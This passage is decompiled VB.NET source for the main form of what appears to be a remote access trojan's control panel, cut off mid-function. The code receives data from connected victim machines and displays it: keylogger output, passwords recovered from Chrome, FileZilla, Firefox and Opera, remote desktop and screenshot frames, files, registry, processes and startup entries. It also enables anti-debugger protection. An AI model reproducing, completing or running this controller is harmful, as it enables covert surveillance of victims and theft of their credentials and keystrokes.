Imports ComponentOwl.BetterListView
Imports fLaSh.Dissembler
Imports LuxNET.LuxNET
Imports Manina.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.CodeDom.Compiler
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms
Imports LuxNET.LuxNET.ServerClient
Imports LuxNET.LuxNET.ServerListener

Public Class FormMain
    Inherits Form
    Implements IMessageFilter

    ' Methods
    Public Sub New()
        Me.packer = New Pack
        Me.listener = New ServerListener
        Me.sw = New Stopwatch
        Me.swwebcam = New Stopwatch
        Me.count = 0
        Me.webcamcount = 0
        Me.called = New Boolean(5 - 1) {}
        Me.Groups = New BetterListViewGroup(6 - 1) {}
        Me.alreadygroup = False
        Me.messageboxresult = New TextBox
        Me.h = 0
        Me.w = 0
        Me.btnthumbnailclicked = False
        Try
            LicenseGlobal.Seal.Catch = True
            LicenseGlobal.Seal.Protection = (RuntimeProtection.Debuggers Or (RuntimeProtection.DebuggersEx Or (RuntimeProtection.Parent Or RuntimeProtection.Timing)))
            Me.InitializeComponent()
            AddHandler AppDomain.CurrentDomain.UnhandledException, New UnhandledExceptionEventHandler(AddressOf Me.CatchUnhandledException)
            Control.CheckForIllegalCrossThreadCalls = False
            Me.listener.BufferSize = &HFFFF
            Me.listener.MaxPacketSize = &H7FFFFFFF
            Application.AddMessageFilter(Me)
            FormMain.DragAcceptFiles(Me.Handle, True)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Private Sub _AddConnection(ByVal txt As String)
        My.Forms.SysManager.LV_Connection.Items.Clear()
        Try
            Dim box As New TextBox
            box.Text = txt
            Dim str2 As String
            For Each str2 In box.Lines
                Dim strArray As String() = str2.Split(New Char() {"|"c})
                Dim str As String = "TCP"
                Dim str3 As String = strArray(0)
                Dim str4 As String = strArray(1)
                Dim str5 As String = strArray(2)
                Dim item As New BetterListViewItem(str, 0)
                item.SubItems.Add(str3)
                item.SubItems.Add(str4)
                item.SubItems.Add(str5)
                My.Forms.SysManager.LV_Connection.Items.AddRange(New BetterListViewItem() {item})
            Next
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub _AddService(ByVal txt As String)
        Try
            Dim box As New TextBox
            box.Text = txt
            My.Forms.SysManager.LV_Service.Items.Clear()
            Dim str2 As String
            For Each str2 In box.Lines
                Dim strArray As String() = str2.Split(New Char() {"|"c})
                Dim str As String = strArray(0)
                Dim str3 As String = strArray(1)
                Dim str4 As String = strArray(2)
                Dim str5 As String = strArray(3)
                Dim item As New BetterListViewItem(str, 0)
                item.SubItems.Add(str3)
                item.SubItems.Add(str4)
                item.SubItems.Add(str5)
                My.Forms.SysManager.LV_Service.Items.AddRange(New BetterListViewItem() {item})
            Next
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub _AddSoftware(ByVal txt As String)
        Try
            My.Forms.SysManager.LV_Software.Items.Clear()
            Dim num2 As Integer = (Me.CountCharacter(txt, "|"c) - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                My.Forms.SysManager.LV_Software.Items.Add(txt.Split(New Char() {"|"c})(i), 0)
                i += 1
            Loop
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub _AddWindows(ByVal txt As String)
        My.Forms.SysManager.LV_Window.Items.Clear()
        Try
            Dim box As New TextBox
            box.Text = txt
            Dim str As String
            For Each str In box.Lines
                Dim strArray As String() = str.Split(New Char() {"|"c})
                Dim str2 As String = strArray(0)
                Dim str3 As String = strArray(1)
                Dim str4 As String = strArray(2)
                Dim item As New BetterListViewItem(str2, Conversions.ToInteger(Interaction.IIf((str4 = "False"), 0, 1)))
                item.SubItems.Add(str3)
                item.SubItems.Add(str4)
                My.Forms.SysManager.LV_Window.Items.AddRange(New BetterListViewItem() {item})
            Next
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub _HandleProcess(ByVal args As String)
        Try
            Dim box As New TextBox
            box.Text = args
            My.Forms.SysManager.LV_Process.Items.Clear()
            Dim str2 As String
            For Each str2 In box.Lines
                Dim strArray As String() = str2.Split(New Char() {"|"c})
                Dim str As String = strArray(0)
                Dim str3 As String = strArray(1)
                Dim str4 As String = strArray(2)
                Dim str5 As String = strArray(3)
                Dim item As New BetterListViewItem(str, 0)
                item.SubItems.Add(str3)
                item.SubItems.Add(str4)
                item.SubItems.Add(str5)
                My.Forms.SysManager.LV_Process.Items.AddRange(New BetterListViewItem() {item})
            Next
            Dim item2 As BetterListViewItem
            For Each item2 In My.Forms.SysManager.LV_Process.Items
                If item2.Text.Contains("!") Then
                    item2.Text = (item2.Text.Replace("!", ""))
                    item2.ForeColor = (Color.Red)
                End If
            Next
            My.Forms.SysManager.ToolStripStatusLabel1.Text = ("Total Processes: " & Conversions.ToString(My.Forms.SysManager.LV_Process.Items.Count))
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub lam__10(ByVal a0 As Object)
        Me.Compile(Conversions.ToString(a0))
    End Sub
    Private Sub lam__11(ByVal a0 As Object)
        Me.Scan(Conversions.ToString(a0))
    End Sub
    Private Sub lam__5(ByVal a0 As Object)
        Me.HandleProcess(Conversions.ToString(a0))
    End Sub
    Private Sub lam__6(ByVal a0 As Object)
        Me.AddSoftware(Conversions.ToString(a0))
    End Sub
    Private Sub lam__7(ByVal a0 As Object)
        Me.AddConnection(Conversions.ToString(a0))
    End Sub
    Private Sub lam__8(ByVal a0 As Object)
        Me.AddService(Conversions.ToString(a0))
    End Sub
    Private Sub lam__9(ByVal a0 As Object)
        Me.AddWindows(Conversions.ToString(a0))
    End Sub

    Private Sub AddChatMessage(ByVal txt As String, ByVal client As ServerClient)
        Try
            Dim num2 As Integer = (My.Forms.RemoteChat.clients.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                If (My.Forms.RemoteChat.TV_ConnectedClients.Nodes.Item(i).Text = client.EndPoint.Address.ToString) Then
                    Dim curtext As String()
                    Dim num3 As Integer
                    If (My.Forms.RemoteChat.RichTextBox1.TextLength = 0) Then
                        curtext = My.Forms.RemoteChat.curtext
                        num3 = i
                        curtext(num3) = (curtext(num3) & "Client" & ChrW(13) & ChrW(10) & txt)
                        If (My.Forms.RemoteChat.index = i) Then
                            My.Forms.RemoteChat.RichTextBox1.Text = My.Forms.RemoteChat.curtext(i)
                            My.Forms.RemoteChat.RichTextBox1.ScrollToCaret()
                        ElseIf (My.Forms.RemoteChat.TV_ConnectedClients.Nodes.Item(i).Text = client.EndPoint.Address.ToString) Then
                            My.Forms.RemoteChat.TV_ConnectedClients.Nodes.Item(i).ImageIndex = 1
                        End If
                    Else
                        curtext = My.Forms.RemoteChat.curtext
                        num3 = i
                        curtext(num3) = (curtext(num3) & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "Client" & ChrW(13) & ChrW(10) & txt)
                        If (My.Forms.RemoteChat.index = i) Then
                            My.Forms.RemoteChat.RichTextBox1.Text = My.Forms.RemoteChat.curtext(i)
                            My.Forms.RemoteChat.RichTextBox1.ScrollToCaret()
                        ElseIf (My.Forms.RemoteChat.TV_ConnectedClients.Nodes.Item(i).Text = client.EndPoint.Address.ToString) Then
                            My.Forms.RemoteChat.TV_ConnectedClients.Nodes.Item(i).ImageIndex = 1
                        End If
                    End If
                End If
                i += 1
            Loop
            GC.Collect()
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub AddClient(ByVal a As String, ByVal b As String, ByVal c As String, ByVal d As String, ByVal e As String, ByVal f As String, ByVal g As String, ByVal h As String, ByVal i As String, ByVal j As String, ByVal client As ServerClient)
        Try
            Dim obj2 As Object
            Dim arguments As Object() = New Object() {b, RuntimeHelpers.GetObjectValue(Me.Flag2Img(a))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            If Not copyBack(0) Then
                obj2 = NewLateBinding.LateGet(Me.LV_Clients.Items, Nothing, "Add", arguments, Nothing, Nothing, copyBack)
            Else
                b = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                obj2 = NewLateBinding.LateGet(Me.LV_Clients.Items, Nothing, "Add", arguments, Nothing, Nothing, copyBack)
            End If
            Dim objArray3 As Object() = New Object(1 - 1) {}
            Dim endPoint As IPEndPoint = client.EndPoint
            objArray3(0) = endPoint.Address
            Dim objArray4 As Object() = objArray3
            Dim flagArray2 As Boolean() = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray4, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                endPoint.Address = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4(0)), GetType(IPAddress)), IPAddress)
            End If
            objArray4 = New Object(1 - 1) {}
            Dim item As ListViewItem = Me.LV_Ports.Items.Item(0)
            objArray4(0) = item.Text
            objArray3 = objArray4
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                item.Text = (CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String))))
            End If
            objArray3 = New Object() {c}
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                c = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
            End If
            objArray3 = New Object() {d}
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                d = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
            End If
            objArray3 = New Object() {e}
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                e = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
            End If
            objArray3 = New Object() {f}
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                f = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
            End If
            objArray3 = New Object() {g}
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                g = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
            End If
            objArray3 = New Object() {h}
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                h = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
            End If
            objArray3 = New Object() {i}
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                i = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
            End If
            objArray3 = New Object() {j}
            flagArray2 = New Boolean() {True}
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
            If flagArray2(0) Then
                j = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
            End If
            NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", New Object() {(Conversions.ToString(Me.ping(client.EndPoint.Address.ToString)) & " ms")}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSetComplex(obj2, Nothing, "Tag", New Object() {client}, Nothing, Nothing, False, True)
            obj2 = Nothing
            If Me.cb_notify.Checked Then
                Me.Invoke(New DelegateShowNotification(AddressOf Me.ShowNotification), New Object() {b, client.EndPoint.Address.ToString, (e & " / " & d), RuntimeHelpers.GetObjectValue(Me.Flag2Img(a))})
            End If
            Me.HandleOnConnect(b, c, f, i, client)
            GC.Collect()
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub AddCMD(ByVal txt As String)
        My.Forms.SysManager.rtb_cmd.AppendText(txt)
        My.Forms.SysManager.rtb_cmd.ScrollToCaret()
    End Sub

    Private Sub AddConnection(ByVal txt As String)
        Me.Invoke(New Delegate_AddConnection(AddressOf Me._AddConnection), New Object() {txt})
    End Sub

    Private Sub AddDrives(ByVal params As String)
        Dim num2 As Integer = (Me.CountCharacter(params, "|"c) - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            My.Forms.FileManager.cb_path.Items.Add(params.Split(New Char() {"|"c})(i))
            i += 1
        Loop
    End Sub

    Private Sub AddException(ByVal location As String, ByVal ex As String)
        If (location = "FileManager") Then
            My.Forms.FileManager.ToolStripStatusLabel2.Text = ex
        ElseIf (location = "SysManager") Then
            My.Forms.SysManager.ToolStripStatusLabel1.Text = ex
        ElseIf (location = "Main") Then
            Me.StatusBarMain.Text = ex
        ElseIf (location = "Scripting") Then
            My.Forms.Scripting.ToolStripStatusLabel1.Text = ex
        ElseIf (location = "Fun") Then
            My.Forms.FunManager.ToolStripStatusLabel1.Text = ex
        ElseIf (location = "Registry") Then
            My.Forms.RegistryManager.Label_Information.Text = ex
        End If
    End Sub

    Private Sub AddFiles(ByVal params As String)
        Me.path = params.Split(New Char() {"|"c})(0)
        My.Forms.FileManager.cb_path.Text = Me.path
        params = params.Replace((params.Split(New Char() {"|"c})(0) & "|"), "")
        Dim box As New TextBox
        box.Text = params
        Dim str2 As String
        For Each str2 In box.Lines
            Dim strArray As String() = str2.Split(New Char() {"|"c})
            Dim str As String = strArray(0)
            Dim str3 As String = strArray(1)
            Dim str4 As String = strArray(2)
            If ((str4 Is Nothing) OrElse (str4.Length = 0)) Then
                Dim item As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 0)
                item.SubItems.Add(str3)
                item.SubItems.Add(str4)
                item = Nothing
            ElseIf (str.Contains(".exe") Or str.Contains(".EXE")) Then
                Dim item2 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 1)
                item2.SubItems.Add(str3)
                item2.SubItems.Add(str4)
                item2 = Nothing
            ElseIf (((((str.Contains(".xls") Or str.Contains(".XLS")) Or str.Contains(".xlt")) Or str.Contains(".XLT")) Or str.Contains(".XLTX")) Or str.Contains(".xltx")) Then
                Dim item3 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 3)
                item3.SubItems.Add(str3)
                item3.SubItems.Add(str4)
                item3 = Nothing
            ElseIf (((str.Contains(".swf") Or str.Contains(".SWF")) Or str.Contains(".flv")) Or str.Contains(".FLV")) Then
                Dim item4 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 4)
                item4.SubItems.Add(str3)
                item4.SubItems.Add(str4)
                item4 = Nothing
            ElseIf (((str.Contains(".htm") Or str.Contains(".HTM")) Or str.Contains(".html")) Or str.Contains(".HTML")) Then
                Dim item5 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 5)
                item5.SubItems.Add(str3)
                item5.SubItems.Add(str4)
                item5 = Nothing
            ElseIf (str.Contains(".ai") Or str.Contains(".AI")) Then
                Dim item6 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 6)
                item6.SubItems.Add(str3)
                item6.SubItems.Add(str4)
                item6 = Nothing
            ElseIf (((((((str.Contains(".aac") Or str.Contains(".AAC")) Or str.Contains(".m4a")) Or str.Contains(".M4A")) Or str.Contains(".mp3")) Or str.Contains(".MP3")) Or str.Contains(".wav")) Or str.Contains(".WAV")) Then
                Dim item7 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 7)
                item7.SubItems.Add(str3)
                item7.SubItems.Add(str4)
                item7 = Nothing
            ElseIf (str.Contains(".pdf") Or str.Contains(".PDF")) Then
                Dim item8 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 8)
                item8.SubItems.Add(str3)
                item8.SubItems.Add(str4)
                item8 = Nothing
            ElseIf (str.Contains(".psd") Or str.Contains(".PSD")) Then
                Dim item9 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 9)
                item9.SubItems.Add(str3)
                item9.SubItems.Add(str4)
                item9 = Nothing
            ElseIf (((((str.Contains(".php") Or str.Contains(".php3")) Or str.Contains(".phtml")) Or str.Contains(".PHP")) Or str.Contains(".PHTML")) Or str.Contains(".PHP3")) Then
                Dim item10 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 10)
                item10.SubItems.Add(str3)
                item10.SubItems.Add(str4)
                item10 = Nothing
            ElseIf (((str.Contains(".ppt") Or str.Contains(".PPT")) Or str.Contains(".PPTX")) Or str.Contains(".pptx")) Then
                Dim item11 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 11)
                item11.SubItems.Add(str3)
                item11.SubItems.Add(str4)
                item11 = Nothing
            ElseIf (((((((str.Contains(".sln") Or str.Contains(".SLN")) Or str.Contains(".user")) Or str.Contains(".USER")) Or str.Contains(".PDB")) Or str.Contains(".pdb")) Or str.Contains(".RESX")) Or str.Contains(".resx")) Then
                Dim item12 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 12)
                item12.SubItems.Add(str3)
                item12.SubItems.Add(str4)
                item12 = Nothing
            ElseIf (((str.Contains(".doc") Or str.Contains(".DOC")) Or str.Contains(".docx")) Or str.Contains(".DOCX")) Then
                Dim item13 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 13)
                item13.SubItems.Add(str3)
                item13.SubItems.Add(str4)
                item13 = Nothing
            ElseIf (((str.Contains(".xaml") Or str.Contains(".XAML")) Or str.Contains(".xml")) Or str.Contains(".XML")) Then
                Dim item14 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 14)
                item14.SubItems.Add(str3)
                item14.SubItems.Add(str4)
                item14 = Nothing
            ElseIf (str.Contains(".bfc") Or str.Contains(".BFC")) Then
                Dim item15 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 15)
                item15.SubItems.Add(str3)
                item15.SubItems.Add(str4)
                item15 = Nothing
            ElseIf (str.Contains(".sql") Or str.Contains(".SQL")) Then
                Dim item16 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, &H10)
                item16.SubItems.Add(str3)
                item16.SubItems.Add(str4)
                item16 = Nothing
            ElseIf (str.Contains(".pst") Or str.Contains(".PST")) Then
                Dim item17 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, &H12)
                item17.SubItems.Add(str3)
                item17.SubItems.Add(str4)
                item17 = Nothing
            ElseIf (((((((((((str.Contains(".3gpp") Or str.Contains(".3GPP")) Or str.Contains(".avi")) Or str.Contains(".AVI")) Or str.Contains(".mp4")) Or str.Contains(".MP4")) Or str.Contains(".mov")) Or str.Contains(".MOV")) Or str.Contains(".mpeg")) Or str.Contains(".MPEG")) Or str.Contains(".WMA")) Or str.Contains(".wma")) Then
                Dim item18 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, &H13)
                item18.SubItems.Add(str3)
                item18.SubItems.Add(str4)
                item18 = Nothing
            ElseIf (((((str.Contains(".zip") Or str.Contains(".ZIP")) Or str.Contains(".rar")) Or str.Contains(".RAR")) Or str.Contains(".tar.gz")) Or str.Contains(".TAR.GZ")) Then
                Dim item19 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 20)
                item19.SubItems.Add(str3)
                item19.SubItems.Add(str4)
                item19 = Nothing
            ElseIf (((((((((((str.Contains(".jpeg") Or str.Contains(".JPEG")) Or str.Contains(".jpg")) Or str.Contains(".JPG")) Or str.Contains(".gif")) Or str.Contains(".GIF")) Or str.Contains(".bmp")) Or str.Contains(".BMP")) Or str.Contains(".png")) Or str.Contains(".PNG")) Or str.Contains(".ico")) Or str.Contains(".ICO")) Then
                Dim item20 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 21)
                item20.SubItems.Add(str3)
                item20.SubItems.Add(str4)
                item20 = Nothing
            ElseIf (((str.Contains(".rb") Or str.Contains(".RB")) Or str.Contains(".py")) Or str.Contains(".PY")) Then
                Dim item21 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, &H16)
                item21.SubItems.Add(str3)
                item21.SubItems.Add(str4)
                item21 = Nothing
            ElseIf (((((((str.Contains(".vb") Or str.Contains(".VB")) Or str.Contains(".cs")) Or str.Contains(".CS")) Or str.Contains(".BAT")) Or str.Contains(".bat")) Or str.Contains(".CMD")) Or str.Contains(".cmd")) Then
                Dim item22 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 2)
                item22.SubItems.Add(str3)
                item22.SubItems.Add(str4)
                item22 = Nothing
            ElseIf (str.Contains(".txt") Or str.Contains(".TXT")) Then
                Dim item23 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, 23)
                item23.SubItems.Add(str3)
                item23.SubItems.Add(str4)
                item23 = Nothing
            Else
                Dim item24 As BetterListViewItem = My.Forms.FileManager.LV_Filemanager.Items.Add(str, &H11)
                item24.SubItems.Add(str3)
                item24.SubItems.Add(str4)
                item24 = Nothing
            End If
        Next
        GC.Collect()
    End Sub

    Private Sub AddHostsFile(ByVal txt As String)
        My.Forms.SysManager.rtb_hostsfile.Clear()
        My.Forms.SysManager.rtb_hostsfile.Text = txt
    End Sub

    Public Sub AddImage(ByVal params As Byte())
        Try
            Me.count = (Me.count + 1)
            Dim stream As New MemoryStream(params)
            My.Forms.RemoteDesktop.PictureBox1.Image = Image.FromStream(stream)
            My.Forms.RemoteDesktop.LabelFPS.Text = ("FPS: " & Conversions.ToString(CInt(Math.Round(CDbl(((CDbl(Me.count) / Me.sw.Elapsed.TotalSeconds) * 2))))))
            GC.Collect()
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub Addkeylogs(ByVal logs As String)
        Try
            If (My.Forms.Keylogger.rtb_log.Text <> logs) Then
                My.Forms.Keylogger.rtb_log.Text = logs
                My.Forms.Keylogger.rtb_log.ScrollToCaret()
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddListViewItems(ByVal itm As String, ByVal subitem As String)
        Me.LV_Scanner.Items.Add(itm).SubItems.Add(subitem)
    End Sub

    Private Sub AddMonitorCount(ByVal count As Integer)
        Dim num2 As Integer = count
        Dim i As Integer = 1
        Do While (i <= num2)
            My.Forms.RemoteDesktop.ComboBox1.Items.Add(i)
            My.Forms.RemoteDesktop.ComboBox1.Text = "1"
            i += 1
        Loop
    End Sub

    Private Sub AddMonitorCount2(ByVal count As Integer)
        Dim num2 As Integer = count
        Dim i As Integer = 1
        Do While (i <= num2)
            My.Forms.ScreenshotManager.ComboBox1.Items.Add(i)
            My.Forms.ScreenshotManager.ComboBox1.Text = "1"
            i += 1
        Loop
    End Sub

    Private Sub AddOutput(ByVal txt As String)
        Me.rtb_output.AppendText(String.Concat(New String() {"[", Conversions.ToString(My.Computer.Clock.LocalTime.Hour), ":", Conversions.ToString(My.Computer.Clock.LocalTime.Minute), ":", Conversions.ToString(My.Computer.Clock.LocalTime.Second), "] ", txt, ChrW(13) & ChrW(10)}))
    End Sub

    Private Sub AddPasswords(ByVal txt As String, ByVal client As ServerClient)
        My.Forms.PasswordRecovery.LV_Passwords.Items.Clear()
        Try
            Dim box As New TextBox
            box.Text = txt
            Dim str2 As String
            For Each str2 In box.Lines
                Dim strArray As String() = str2.Split(New Char() {"|"c})
                Dim str As String = strArray(0)
                Dim str3 As String = strArray(1)
                Dim str4 As String = strArray(2)
                Dim str5 As String = strArray(3)
                Select Case str3
                    Case "Chrome"
                        Dim item As New BetterListViewItem(str, 0)
                        item.SubItems.Add(str3)
                        item.SubItems.Add(str4)
                        item.SubItems.Add(str5)
                        My.Forms.PasswordRecovery.LV_Passwords.Items.AddRange(New BetterListViewItem() {item})
                        Exit Select
                    Case "FileZilla"
                        Dim item2 As New BetterListViewItem(str, 1)
                        item2.SubItems.Add(str3)
                        item2.SubItems.Add(str4)
                        item2.SubItems.Add(str5)
                        My.Forms.PasswordRecovery.LV_Passwords.Items.AddRange(New BetterListViewItem() {item2})
                        Exit Select
                    Case "Mozilla Firefox"
                        Dim item3 As New BetterListViewItem(str, 2)
                        item3.SubItems.Add(str3)
                        item3.SubItems.Add(str4)
                        item3.SubItems.Add(str5)
                        My.Forms.PasswordRecovery.LV_Passwords.Items.AddRange(New BetterListViewItem() {item3})
                        Exit Select
                    Case "Opera"
                        Dim item4 As New BetterListViewItem(str, 3)
                        item4.SubItems.Add(str3)
                        item4.SubItems.Add(str4)
                        item4.SubItems.Add(str5)
                        My.Forms.PasswordRecovery.LV_Passwords.Items.AddRange(New BetterListViewItem() {item4})
                        Exit Select
                End Select
            Next
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddPCBounds(ByVal width As Integer, ByVal height As Integer)
        My.Forms.RemoteDesktop.pcwidth = width
        My.Forms.RemoteDesktop.pcheight = height
    End Sub

    Private Sub AddRegistryKeys(ByVal keys As String)
        Try
            My.Forms.RegistryManager.curnode.Nodes.Clear()
            Dim num2 As Integer = (Me.CountCharacter(keys, "|"c) - 1)
            Dim i As Integer = 0
            Do While (i <= num2)
                My.Forms.RegistryManager.curnode.Nodes.Add(keys.Split(New Char() {"|"c})(i))
                i += 1
            Loop
            My.Forms.RegistryManager.curnode.ExpandAll()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddRegistryValues(ByVal values As String)
        Try
            Dim box As New TextBox
            box.Text = values
            My.Forms.RegistryManager.ListView1.Items.Clear()
            Dim str2 As String
            For Each str2 In box.Lines
                Dim strArray As String() = str2.Split(New Char() {"|"c})
                Dim str As String = strArray(0)
                Dim str3 As String = strArray(1)
                Dim str4 As String = strArray(2)
                Dim item As New BetterListViewItem(str, Conversions.ToInteger(Interaction.IIf((str3 = "Binary"), 1, 0)))
                item.SubItems.Add(str3)
                item.SubItems.Add(str4)
                My.Forms.RegistryManager.ListView1.Items.AddRange(New BetterListViewItem() {item})
            Next
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddRemoteDesktopImage(ByVal params As Byte())
        Me.sw.Start()
        Me.Invoke(New DelegateAddImage(AddressOf Me.AddImage), New Object() {params})
    End Sub

    Private Sub AddScreenshot(ByVal byt As Byte())
        Try
            Dim stream As New MemoryStream(byt)
            My.Forms.ScreenshotManager.PictureBox1.Image = Image.FromStream(stream)
            GC.Collect()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub AddService(ByVal txt As String)
        Me.Invoke(New Delegate_AddService(AddressOf Me._AddService), New Object() {txt})
    End Sub

    Private Sub AddSoftware(ByVal txt As String)
        Me.Invoke(New Delegate_AddSoftware(AddressOf Me._AddSoftware), New Object() {txt})
    End Sub

    Private Sub AddStartup(ByVal txt As String)
        Try
            Dim num4 As Integer
            My.Forms.SysManager.LV_Startup.Items.Clear()
            Me.Groups(0) = New BetterListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run")
            Me.Groups(1) = New BetterListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce")
            Me.Groups(2) = New BetterListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run")
            Me.Groups(3) = New BetterListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce")
            Me.Groups(4) = New BetterListViewGroup("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
            Dim index As Integer = 0
            Do
                Me.Groups(index).Font = (New Font("Verdana", 10.0!))
                My.Forms.SysManager.LV_Startup.Groups.Add(Me.Groups(index))
                index += 1
                num4 = 4
            Loop While (index <= num4)
            My.Forms.SysManager.LV_Startup.ShowGroups = (True)
            Dim num3 As Integer = (Me.CountCharacter(txt, ChrW(167)) - 1)
            Dim i As Integer = 0
            Do While (i <= num3)
                Dim str As String = txt.Split(New Char() {ChrW(167)})(i)
